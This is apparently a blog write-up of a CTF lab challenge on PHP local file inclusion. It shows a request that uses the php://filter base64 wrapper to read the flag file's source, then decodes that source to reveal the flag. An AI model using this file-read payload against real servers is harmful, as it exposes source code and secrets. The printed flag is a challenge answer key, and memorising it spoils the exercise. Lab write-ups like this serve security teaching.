---
layout: post
title:  "网安实验-CTF实验-18lfi题解"
date:   2023-03-24 12:34:58
categories: CTF
tags: 网络安全 CTF lfi
author: NanKe
---

* content
{:toc}
> 记录网安实验-CTF实验-18lfi题解



# 问题描述

lfi，提交flag格式为：nuaactf{}，考点：文件包含，题目描述`如下图所示`：
![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241230283.png)

启动靶机，如`下图所示`：
![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241231972.png)

---

# 问题分析：

> 首先应该判断出服务端使用的是PHP，然后采用PHP漏洞`php://filter协议在任意文件读取`，读取真正存在flag的PHP文件。对读取的PHP文件进行代码审计，对相关代码进行对应编码和解码操作即可得到正确的flag

---

# 解决方案：

- 重新组装靶机请求地址为：`http://39116871.clsadp.com/?file=php://filter/read=convert.base64-encode/resource=flag`

访问结果`如下图所示`：
![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241231663.png)

- 此时已经得到Base64编码的文件内容，此时使用Base64进行解码操作，得到PHP文件内容如下所示：

```php
<?php

// this is the real flag!
// congratulations!
$flag = urldecode(base64_decode('bnVhYWN0ZiU3QnRyeWluZ18yX3VzZV9MRklfeWVhaF8lMjElN0Q='));

?>
nuaactf{this_is_the_fake_flag}
<br><br>
Sorry, this is not the real flag.
```

- 代码审计后，明白flag是由`bnVhYWN0ZiU3QnRyeWluZ18yX3VzZV9MRklfeWVhaF8lMjElN0Q=`字符串进行Base64解码后，使用URL解码得到

- 具体过程如下所示：
  对得到的文件内容进行Base64解码操作，`如下图所示`：
  ![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241231726.png)
  此时已经得到PHP源码，进行代码审计，对`bnVhYWN0ZiU3QnRyeWluZ18yX3VzZV9MRklfeWVhaF8lMjElN0Q=`字符串进行Base64解码，`如下图所示`：
  ![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241231721.png)
  最后对`nuaactf%7Btrying_2_use_LFI_yeah_%21%7D`进行URL解码，得到正确的`nuaactf{trying_2_use_LFI_yeah_!}`，`如下图所示`：
  ![在这里插入图片描述](https://raw.githubusercontent.com/crazymen-nanke/image/master/note/202303241231560.png)

# 参考资料：

>csdn博客：https://blog.csdn.net/L2329794714/article/details/121288668
>Base64在线解码编码工具：https://base64.us/
>URL在线解码编码工具：https://meyerweb.com/eric/tools/dencoder/